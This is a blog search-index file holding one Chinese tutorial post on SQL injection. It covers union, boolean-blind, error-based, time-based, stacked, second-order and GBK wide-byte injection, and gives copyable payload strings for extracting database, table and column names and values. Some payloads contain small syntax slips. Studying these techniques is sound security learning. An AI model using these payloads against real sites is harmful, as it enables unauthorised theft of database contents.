<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql注入相关学习</title>
      <link href="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>前端向后端发送某些数据，后端在向数据库发送sql语句请求时，如果没有对相关参数进行严格过滤，则有可能会导致危险的SQL语句被输入数据库中进行查询，从而导致数据库被未授权增删改查。</p><h2 id="sql注入要素"><a href="#sql注入要素" class="headerlink" title="sql注入要素"></a>sql注入要素</h2><p>1.输入内容的位置没有做限制，用户可以自由控制输入的内容。（参数用户可控）</p><p>2.用户输入的内容可以被带入数据库中执行。（参数带入数据库查询）</p><p>以后端php语句为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id = $_GET[&#x27;id&#x27;]&quot;;</span><br></pre></td></tr></table></figure><p>那么这里的参数id就是可控的，我们可以任意拼接sql语句进行攻击。</p><p>当传入的ID参数为1’时，数据库执行的代码如下图所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1&#x27;</span><br></pre></td></tr></table></figure><p>这行sql语句不符合数据库语句规范，所以会产生报错。当传入的ID参数为1 and 1&#x3D;1时，执行的SQL语句如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 and 1=1  #当为真时</span><br><span class="line">select * from users where id = 1 and 1=2  #当为假时</span><br></pre></td></tr></table></figure><p>因为1&#x3D;1为真，所以where语句中id&#x3D;1也为真所以会返回和id&#x3D;1相同的结果。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727114202322.png" class="" title="image-20240727114202322"><p>因为1&#x3D;2为假，所以where语句中id&#x3D;1也为假所以会返回和id&#x3D;1不同的结果。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727114217816.png" class="" title="image-20240727114217816"><p>这里放一个参考表</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727115824592.png" class="" title="image-20240727115824592"><h2 id="MySQL相关知识点"><a href="#MySQL相关知识点" class="headerlink" title="MySQL相关知识点"></a>MySQL相关知识点</h2><h3 id="库名、表名、字段名"><a href="#库名、表名、字段名" class="headerlink" title="库名、表名、字段名"></a>库名、表名、字段名</h3><p>MySQL5.0版本之后，会在数据库中默认存放一个<strong>information_schema</strong>的数据库，在这之中，有三个表名需要记住，分别是<strong>SCHEMATA</strong>、<strong>TABLES</strong>和<strong>COLUMNS</strong>。</p><h4 id="SCHEMATA"><a href="#SCHEMATA" class="headerlink" title="SCHEMATA"></a>SCHEMATA</h4><p><strong>SCHEMATA</strong>表储存用户创建的所有数据库的库名，我需要记住该表中记录数据库库名的字段名为<strong>SCHEMA_NAME（库名）</strong></p><h4 id="TABLES"><a href="#TABLES" class="headerlink" title="TABLES"></a>TABLES</h4><p><strong>TABLES</strong>表储存该用户创建的所有数据库的库名和表名，我们需要记住该表中记录数据库的库名和表名的字段名分别为<strong>TABLE_SCHEMA（库名）</strong>和<strong>TABLE_NAME（表名）</strong>。</p><h4 id="COLUMNS"><a href="#COLUMNS" class="headerlink" title="COLUMNS"></a>COLUMNS</h4><p><strong>COLUMNS</strong>表储存用户创建的所有库名、表名和字段名，我们需要记住其中的<strong>TABLE_SCHEMA（库名）</strong>、<strong>TABLE_NAME（表名）</strong>和<strong>COLUMN_NAME（字段名）</strong>。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727110242528.png" class="" title="image-20240727110242528"><h3 id="MySQL查询语句"><a href="#MySQL查询语句" class="headerlink" title="MySQL查询语句"></a>MySQL查询语句</h3><p>在不知道任何条件时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM 库名，表名</span><br></pre></td></tr></table></figure><p>在已知一条条件时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM 库名，表名 WHERE 已知条件的字段名=&#x27;已知条件的值&#x27;</span><br></pre></td></tr></table></figure><p>在已知两条条件时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM 库名，表名 WHERE 已知条件一的字段名=&#x27;已知条件一的值&#x27; AND 已知条件二的字段名=&#x27;已知条件二的值&#x27;</span><br></pre></td></tr></table></figure><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727105718625.png" class="" title="image-20240727105718625"><h3 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h3><p>limit的使用格式为limit m,n；其中m是记录开始的位置，从0开始记录，n是值取n条记录。例如limit 0,1是指从第一条记录开始，取一条记录。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727105920048.png" class="" title="image-20240727105920048"><h3 id="要记住的几个函数"><a href="#要记住的几个函数" class="headerlink" title="要记住的几个函数"></a>要记住的几个函数</h3><p>database（）：当前网站使用的数据库</p><p>version（）：当前mysql版本</p><p>user（）：当前mysql用户</p><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>mysql常见注释符表达方式：#或者–空格或者&#x2F;**&#x2F;。</p><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式:/*!code*/</span><br></pre></td></tr></table></figure><p>内联注释可以用于整个SQL语句中，用来执行sql语句，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</span><br></pre></td></tr></table></figure><p>内联注释可以用来写入语句中的某一位置来完成绕过。</p><hr><h2 id="联合注入-Union"><a href="#联合注入-Union" class="headerlink" title="联合注入(Union)"></a>联合注入(Union)</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>首先通过手注 1&#x2F;1’ 和 1 and 1&#x3D;1&#x2F;1 and 1&#x3D;2 判断是否存在SQL注入，如果&#x2F;左右两边的参数输入后两次的返回结果不一致，则说明存在sql注入。（这里建议使用bp的repeater查看返回包。）</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727120546402.png" class="" title="image-20240727120546402"><p>之后使用order by 1-99语句查询该数据表的字段行数，例如，如果访问id&#x3D;1 order by 3，页面返回与id&#x3D;1相同的结果，则说明有第三行，如果访问id&#x3D;1 order by 4,页面返回与id&#x3D;1不同的结果，则说明不存在第四行，所以行数为三行。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727120518311.png" class="" title="image-20240727120518311"><p>由于是将数据输出到页面上的，所以可以使用联合查询（union注入），并通过order by查询结果，我们可以通过访问以下内容来查看查看回显。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2,3--+</span><br><span class="line"></span><br><span class="line">#这里的+会被解析成空格，使注释符后的内容不被解析，同理，--%20也一样，或者将#换成%23也一样。</span><br><span class="line">#id=-1的原因是因为数据库中没有id=-1的数据，所以我们将id的值变成-1，那么回显就会显示我们union select查询的结果。</span><br></pre></td></tr></table></figure><p>查看回显时如果返回了2：3，说明可以在2和3的位置输入mysql语句，比如使用database（），可以查看返回的数据库信息（这里的返回信息是数据库类型），之后就可以获取数据了。</p><p>获取库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line"></span><br><span class="line">#这里的group_concat是将数据库中的内容拼接成一行回显。</span><br></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#limit 0,1获取的是第一行的表名，如果要获取第二行的表名，结合前边提到的limit的使用，就使用limit 1,1。</span><br><span class="line">#如果想要全部回显，就是用前边提到的group_concat函数。</span><br></pre></td></tr></table></figure><p>获取字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#获取其他字段名和上述步骤同理</span><br></pre></td></tr></table></figure><p>获取字段数据</p><p>拿到库名，表名和字段名之后，我们就可以构造SQL语句获取具体的值了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username_id from mysql.usernames limit 0,1</span><br></pre></td></tr></table></figure><p>这里把相关查询语句总结放在这里（Union注入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">id=1 order by 4</span><br><span class="line"></span><br><span class="line">#确定位置,后续语句将1，2，3中某个可用数字更改为(该语句)</span><br><span class="line">id=-1&#x27; union select 1,2,3</span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1            </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">select username_id from mysql.usernames limit 0,1</span><br></pre></td></tr></table></figure><h2 id="布尔盲注-Boolean"><a href="#布尔盲注-Boolean" class="headerlink" title="布尔盲注(Boolean)"></a>布尔盲注(Boolean)</h2><h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><p><strong>判断长度</strong></p><p>首先通过在id&#x3D;1后边添加单引号来判断是否存在SQL注入，之后在通过拼接and 1&#x3D;1%23和and 2&#x3D;2%23再次查看（这里%23是#注释符，用于将后边代码命令注释掉）。</p><p>如果发现返回包中的返回结果只有yes或者no说明，无法返回数据，只能返回yes或者no，那么合理我们就只能使用Boolean盲注。</p><p>首先来判断数据库名长度，id&#x3D;1后拼接以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and length(database())=1--+ </span><br><span class="line"></span><br><span class="line">#有单引号所以需要注释符来注释，1的位置上可以是任何数字，这里用不同的数字查看返回的结果，如果是yes说明长度是该数字，如果是no说明长度不是该数字。（这里数字的含义是大于等于该数字）</span><br></pre></td></tr></table></figure><p><strong>查询库名</strong></p><p>接着逐字符判断的方式来获取数据库库名，数据库苦命范围一般在a<del>z，0</del>9之间，可能会加一些特殊字符，字母不区分大小写，相关语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(database(),1,1)=&#x27;m&#x27;--+</span><br><span class="line"></span><br><span class="line">#这里的substr意思是截取database()的值，从第一个字符开始，每次返回一个。</span><br><span class="line">#substr和limit不一样，substr是从1开始排序，而limit是从0开始排序</span><br></pre></td></tr></table></figure><p>之后使用burp的爆破功能爆破其中的’t’的值，通过返回包返回yes或者no来判断是否是该值。</p><p>也可以使用ASCII码的方式进行查询，s的ASCII码是115，mysql的ASCII转换函数是ascii()，那么语句就可以改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><p>那么后边的数据库库名就可以逐步判断了，假如我们前边判断库名长度为5，那么就要往后判断5位，相关语句也要修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(database(),2,1)=&#x27;y&#x27;--+</span><br><span class="line"></span><br><span class="line">#我们在这里判断第几位，database()后的数字就修改成几</span><br></pre></td></tr></table></figure><p><strong>查询表名</strong></p><p>之前查询库名我们在语句中使用了database(),那么我们查询表明就将相应位置替换为查询表名的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br></pre></td></tr></table></figure><p>那么完整的语句就应该更改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1)=&#x27;s&#x27;--+</span><br></pre></td></tr></table></figure><p>那么用这种方法我们很快就可以查出所有的表名和字段名。</p><p>这里把相关查询语句总结放在这里（Boolean盲注）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">&#x27; and length(database())=1--+ </span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">&#x27; and substr(database(),1,1)=&#x27;库名第一位&#x27;--+                 #第一种</span><br><span class="line"></span><br><span class="line">&#x27; and substr((select schema_name from information_schema.schemata limit 0,1),1,1)=&#x27;库名第一位&#x27;                                 #第二种</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1)=&#x27;表名第一位&#x27;--+</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),1,1)=&#x27;字段名第一位&#x27;--+                </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">&#x27; and substr((select username_id from mysql.usernames limit 0,1),1,1)=&#x27;字段名第一位&#x27;--+      </span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h3><p>如果访问的场景url后缀为?username&#x3D;1之类的，我们在参数后边拼接’，在数据库执行语句时会因为语法错误报错，输出到页面的结果输出报错信息。</p><p>报错注入的格式很多，这里用updatexml()演示</p><p>获取use()<strong>的值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#这里的0x7e是ASCII编码，解码结果为~。所以这里返回包的信息应该是~username~</span><br></pre></td></tr></table></figure><p><strong>获取库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>之后可以使用select语句获取库名，表明字段名，查询语句与union注入的相同，因为报错注入只显示一条结果，所以需要使用limit语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取use()值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+  #方法一</span><br><span class="line"></span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select schema_name from         information_schema.schemata limit 0,1),0x7e),1)--+             #方法二</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select username_id from mysql.usernames limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注与布尔盲注很像，首先在url的id&#x3D;1后拼接单引号查看返回包，如果返回的是no，说明只能返回yes或者no，那我们除了布尔盲注外可以通过查看bp里repeater返回包右下角的响应时间来做判断。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240729212148274.png" class="" title="image-20240729212148274"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#1秒=1000毫秒</span><br></pre></td></tr></table></figure><h3 id="流程-3"><a href="#流程-3" class="headerlink" title="流程"></a>流程</h3><p><strong>查询库名长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (length(database())&gt;1,sleep(5),1)</span><br><span class="line"></span><br><span class="line">#意思是如果数据库库名长度大于1，吧呢么MySQL查询休眠5秒，否则查询1，之后就可以通过返回包响应时间来做判断</span><br><span class="line"></span><br><span class="line">if (length(database())&gt;10,sleep(5),1)</span><br><span class="line">#如果把数句酷库名长度改为大于10，返回的时间极少，说明语句被成功执行，说明数据库库名长度不大于10</span><br></pre></td></tr></table></figure><p>之后就可以执行库名等的查询了，语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#查询库名（通过查看返回包的响应式时间来判断字母对不对）</span><br><span class="line">if(substr(database()1,1)=&#x27;s&#x27;,sleep(5),1)           #方法一</span><br><span class="line">if(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=&#x27;s&#x27;,sleep(5),1)                         #方法二</span><br><span class="line"></span><br><span class="line">#查询表名</span><br><span class="line">if(substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1))=&#x27;s&#x27;,sleep(5),1) </span><br><span class="line"></span><br><span class="line">#查询字段名</span><br><span class="line">if(substr((select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1)</span><br><span class="line"></span><br><span class="line">#查询值</span><br><span class="line">if(substr((select username_id from mysql.usernames limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1) </span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠查询可以执行多条语句，多语句之间用分号隔开，堆叠注入就是使用这个特点，在第二个SQL语句中构造自己要执行的语句。</p><h3 id="流程-4"><a href="#流程-4" class="headerlink" title="流程"></a>流程</h3><p>首先访问id&#x3D;1’,页面返回mysql错误，再访问id&#x3D;1’%23,页面返回正常结果，这里就可以使用布尔盲注，时间注入和堆叠注入。</p><p><strong>获取user()值语句</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;select if(substr(user()1,1)=&#x27;s&#x27;,sleep(3),1)%23</span><br><span class="line"></span><br><span class="line">#所以堆叠注入就是&#x27;; select后加时间注入的语句</span><br></pre></td></tr></table></figure><p>那么相应的构造语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">&#x27;; select if (length(database())&gt;1,sleep(3),1)%23</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27;; select if(substr(database()1,1)=&#x27;s&#x27;,sleep(3),1)%23          #方法一</span><br><span class="line"></span><br><span class="line">&#x27;; selectif(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=&#x27;s&#x27;,sleep(3),1)%23#方法二</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27;; select if(substr((select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),1,1))=&#x27;s&#x27;,sleep(3),1)%23</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27;; select if(substr((select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1)%23</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27;; select if(substr((select username_id from mysql.usernames limit 0,1),1,1)=&#x27;s&#x27;,sleep(5),1)%23</span><br></pre></td></tr></table></figure><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入场景假设：两个页面，页面一（1.php）功能是注册用户名，也是插入SQL语句的地方，页面二（2.php）功能是通过参数ID读取用户名和用户信息。</p><h3 id="流程-5"><a href="#流程-5" class="headerlink" title="流程"></a>流程</h3><ul><li><p>访问1.php?username&#x3D;test’,结果返回一个id号为21，这说明用户名test‘对应的id为21，那么我们去另一个页面访问2.php?id&#x3D;21,如果返回了Mysql的错误，说明这里大概率存在SQL注入。</p></li><li><p>我们回到第一个页面访问1.php?username&#x3D;test’ order by 1%23，拿到新的id&#x3D;32，之后带着新的id&#x3D;32去访问页面2.php?id&#x3D;32，返回空白页面。</p></li><li><p>这时我们再拿一个新的id，访问1.php?username&#x3D;test’ order by 10%23，拿到一个新的id&#x3D;33，之后拿着id&#x3D;33去访问页面2.php?id&#x3D;33，如果返回Mysql报错（Unknown column ‘10’ in ‘order clause’）,说明之前的空白页面是正常返回，之后重复order by来判断字段数量。</p></li><li><p>假设这里有三个字段，我们通过访问2.php?username&#x3D;test’ union select 1,2,3%23,获取到新的id&#x3D;39，之后访问2.php?id&#x3D;39,发现返回union select中的2和3字段。</p></li><li><p>那么之后我们就可以在2和3的位置插入查询语句，比如访问1.php?id&#x3D;test’ union select 1,user(),3%23，获取新的id&#x3D;40，得到user()的结果。</p><p>查询语句与联合注入相同，只是查看返回结果时，要拿1.php页面的id号去2.php查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">id=1 order by 4</span><br><span class="line"></span><br><span class="line">#确定位置,后续语句将1，2，3中某个可用数字更改为(该语句)</span><br><span class="line">id=-1&#x27; union select 1,2,3</span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1            </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">select username_id from mysql.usernames limit 0,1</span><br></pre></td></tr></table></figure></li></ul><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>当出现以下场景：</p><p>当访问id&#x3D;1’返回的结果没有报错，而是返回了查询语句并将’前加入了一个转义符\，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where id=&#x27;1\&#x27;&#x27; limit 0,1</span><br></pre></td></tr></table></figure><p>此处说明参数id&#x3D;1在数据库查询时是被单引号包围的，当传入id&#x3D;1’时，传入的单引号被\转义，导致参数ID无法逃逸单引号的包围，所以一般情况下，此处是不存在SQL注入漏洞的，但是有一个特例，当数据库编码为GBK时，可以使用宽字节注入。</p><p>宽字节注入格式是在地址后加一个%df，再加单引号，因为反斜杠的编码是%5c,而在GBK编码中，%df%5c是繁体字’縗’,所以这时，单引号成功逃逸，爆出mysql数据库错误。</p><p>由于输入的参数id&#x3D;1’，导致SQL语句多了一个单引号，所以需要使用注释符来注释自身的单引号，访问id&#x3D;1%df%23,，此时\和%df一起被转义了，所以单引号成功逃逸，SQL语句就符合语法规范。</p><p>之后就可以结合union注入的语句进行查询了，但是格式需要作出一定的改变</p><h3 id="流程-6"><a href="#流程-6" class="headerlink" title="流程"></a>流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#判断注入</span><br><span class="line">id=1%df&#x27; and 1=1%23      #为真时返回结果，返回查询语句</span><br><span class="line">id=1%df&#x27; and 1=2%23      #为假时不返回结果，只返回查询语句</span><br><span class="line"></span><br><span class="line">#查询字段数量</span><br><span class="line">id=1%df&#x27; order by 3%23</span><br><span class="line"></span><br><span class="line">#确定返回位置</span><br><span class="line">id=1%df&#x27; union select 1,2,3%23</span><br><span class="line"></span><br><span class="line">#获取库名,后续语句则是将user(),修改为(该语句)</span><br><span class="line">id=-1%df&#x27; union select 1,user(),3,%23</span><br><span class="line"></span><br><span class="line">#获取表名,单引号被转义，所以这里嵌套查询</span><br><span class="line">select table_name from information_schema.tables where tables_schema=(select database()) limit 0,1%23</span><br><span class="line"></span><br><span 